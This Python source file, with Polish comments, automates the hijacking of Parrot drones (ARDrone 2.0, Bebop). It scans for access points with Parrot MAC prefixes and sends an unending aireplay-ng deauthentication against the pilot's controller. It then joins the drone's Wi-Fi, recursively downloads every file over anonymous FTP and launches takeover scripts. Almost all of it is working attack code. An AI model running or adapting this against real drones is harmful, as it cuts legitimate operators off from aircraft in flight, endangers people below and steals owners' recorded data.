import csv
import subprocess
import sys
import time
import os
import re
from pathlib import Path
from zeroconf import Zeroconf, ServiceListener, ServiceBrowser
from ftplib import error_perm, all_errors, FTP


def get_wlan_interface():
    operation = subprocess.run(
        "iwconfig 2>/dev/null | grep -oE 'wlan[0a-zA-Z]'", shell=True, capture_output=True, text=True)

    interface = operation.stdout.strip()

    if not interface:
        print("Nie znaleziono interfejsu Wi-Fi \nUpewnij sie, ze adapter Wi-Fi jest podlaczony i wykrywany przez system")
        sys.exit(1)

    return interface


def get_free_wlan_interface():
    operation = subprocess.run(
        "iwconfig 2>/dev/null | grep -oE '^wlan1\b'", shell=True, capture_output=True, text=True)

    interface = operation.stdout.strip()

    if not interface or not re.fullmatch(r"wlan[0-9]+", interface):
        print("Nie znaleziono wolnego interfejsu wlanX\n"
              "Upewnij się, że masz podłączony adapter i że wynik "
              "`iwconfig | grep wlan[0-9]+` zwraca np. wlan1, wlan2 itd")
        sys.exit(1)

    return interface


def run_airmon(interface: str):
    subprocess.run(f"sudo airmon-ng start {interface}", shell=True)


def verify_monitor_iface(interface: str):
    if not interface.endswith("mon"):
        raise ValueError(
            f"Interfejs '{interface}' nie jest w trybie monitor (brak dopisku 'mon')")


def gen_airodump(interface, duration=5, file_name="Parrot_scan"):
    subprocess.run(
        f"sudo timeout {duration}s airodump-ng {interface} --write {file_name} --output-format csv", shell=True)


def filter_scan_file(oui, file_name="Parrot_scan"):
    # Uruchamiamy komendę grep, aby przefiltrować dane
    subprocess.run(f"grep -E 'Cipher' {file_name}-01.csv > filtered.csv", shell=True)
    subprocess.run(f"grep -E '00:12:1C|00:26:7E|90:03:B7|90:3A:E6|A0:14:3D' {file_name}-01.csv >> filtered.csv", shell=True)

    # Odczytujemy przefiltrowany plik
    with open("filtered.csv", "r") as file:
        dic = csv.DictReader(file)
        
        for line in dic:
            bssid = line.get("BSSID", "").strip()
            if bssid:  # Jeśli BSSID nie jest puste
                # Szukamy pasujących prefiksów OUI
                for prefix in oui:
                    if bssid.startswith(prefix):
                        channel = line.get(" channel", "").strip()  # Możliwe, że kanał jest w tej samej kolumnie
                        ssid = line.get(" ESSID", "").strip()  # Podobnie z ESSID
                        flag = 1  # Ustawiamy flagę, gdy znajdziemy pasujący BSSID
                        return bssid, channel, ssid, flag

    return None  # Jeśli nie znaleziono żadnego dopasowania


def direct_scan(bssid, channel, interface, duration=5, filename="Parrot_scan_bsp", save_type="--output-format csv"):
    subprocess.run(
        f"sudo timeout {duration}s airodump-ng -c{channel} -d {bssid} {interface} --write {filename} {save_type}", shell=True)


def get_gcs_mac(file_name_direct_scan="Parrot_scan_bsp", filtred_file="gcs_mac"):
    f_direct_scan = f"{file_name_direct_scan}-01.csv"
    filtered_file = f"{filtred_file}-01.csv"
    subprocess.run(
        f"sed -i '/^[[:space:]]*$/d' {f_direct_scan} | tail -n +3 {f_direct_scan} > {filtered_file}", shell=True)

    with open(filtered_file, "r") as file:
        dic = csv.DictReader(file)
        for line in dic:
            gcs_mac = line.get("Station MAC", "").strip()
            return gcs_mac


def del_file(file_name, file_name2):
    subprocess.run(f"sudo rm {file_name}-01.csv", shell=True)
    subprocess.run(f"sudo rm {file_name2}.csv", shell=True)


def deauth_attack(bssid, gcs_mac, interface):
    subprocess.run(
        f"sudo aireplay-ng --deauth 0 -a {bssid} -c {gcs_mac} {interface}", shell=True)


class DroneIdentifier(ServiceListener):
    def __init__(self):
        self.device_type = None
        self.device_ip = None

    def add_service(self, zeroconf, service_type, name):
        print(f"[mDNS] Wykryto usługę: {name}")
        self.device_type = name.split(
            '-')[0] if '-' in name else name.split('.')[0]
        info = zeroconf.get_service_info(service_type, name)
        if info and info.addresses:
            self.device_ip = ".".join(str(b) for b in info.addresses[0])


def identify_drone_type(timeout=5):
    zeroconf = Zeroconf()
    listener = DroneIdentifier()
    arsdk_services = [
        "_arsdk-0901._udp.local.",
        "_arsdk-0902._udp.local.",
        "_arsdk-0903._udp.local.",
        "_arsdk-0905._udp.local.",
        "_arsdk-0906._udp.local."
    ]
    browsers = [ServiceBrowser(zeroconf, s, listener) for s in arsdk_services]
    print("\u231b Trwa wykrywanie typu drona przez mDNS...")
    time.sleep(timeout)
    zeroconf.close()
    return listener.device_type, listener.device_ip


def download_all_from_ftp(ip, ports=[21, 5551], base_dir="ftp_all_files"):
    ftp = None
    for port in ports:
        print(f"Próba połączenia z FTP: {ip}:{port}")
        try:
            ftp = FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login()
            print(f"Połączono z FTP na porcie {port}")
            break
        except Exception as e:
            print(f"Nie udało się połączyć na porcie {port}: {e}")
            ftp = None

    if ftp is None:
        print("Nie udało się połączyć z FTP na żadnym porcie")
        return

    Path(base_dir).mkdir(exist_ok=True)

    def recursive_download(remote_path="/", local_path=base_dir):
        try:
            ftp.cwd(remote_path)
        except error_perm:
            return

        try:
            items = ftp.nlst()
        except all_errors as e:
            print(f"Błąd przy listowaniu {remote_path}: {e}")
            return

        for item in items:
            if item in [".", ".."]:
                continue

            remote_item = f"{remote_path}/{item}".replace("//", "/")
            local_item_path = os.path.join(local_path, item)

            try:
                ftp.cwd(remote_item)
                print(f"Wchodzę do katalogu: {remote_item}")
                Path(local_item_path).mkdir(exist_ok=True)
                recursive_download(remote_item, local_item_path)
                ftp.cwd("..")
            except error_perm:
                print(f"Pobieram plik: {remote_item}")
                try:
                    with open(local_item_path, "wb") as f:
                        ftp.retrbinary(f"RETR {remote_item}", f.write)
                except Exception as e:
                    print(f"Nie udało się pobrać {remote_item}: {e}")

    recursive_download()
    ftp.quit()
    print("Pobieranie zakończone ;)")


def drone_hijack(interface: str, ssid: str, password: str = None, bssid: str = None) -> None:
    ssid_escaped = ssid.replace(" ", "\\ ")
    cmd = ["sudo", "nmcli", "device", "wifi",
           "connect", ssid_escaped, "ifname", interface]
    if password:
        cmd += ["password", password]
    if bssid:
        cmd += ["bssid", bssid]

    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        raise RuntimeError(
            f"Nie udało się połączyć z {ssid!r}: {proc.stderr or proc.stdout}")
    print(f"Połączono z {ssid!r} na {interface!r}")

    device_type, drone_ip = identify_drone_type()
    if not device_type:
        print("Nie udało się wykryć typu drona przez mDNS")
        return

    print(f"Wykryto typ drona: {device_type}")
    print(f"Adres IP drona: {drone_ip or 'brak'}")

    if drone_ip:
        download_all_from_ftp(drone_ip)
    else:
        print("Brak IP (nie można rozpocząć pobierania FTP)")

    if device_type.lower() == "ardrone2":
        print("Uruchamianie skryptu ARDrone 2.0")
        subprocess.run(["python3 ardrone_control.py"])
    elif device_type.lower() == "bebopdrone":
        print("Uruchamianie skryptu Bebop")
        subprocess.run(["python3 parrot_control.py"])
    else:
        print(f"Nierozpoznany typ drona: {device_type}")
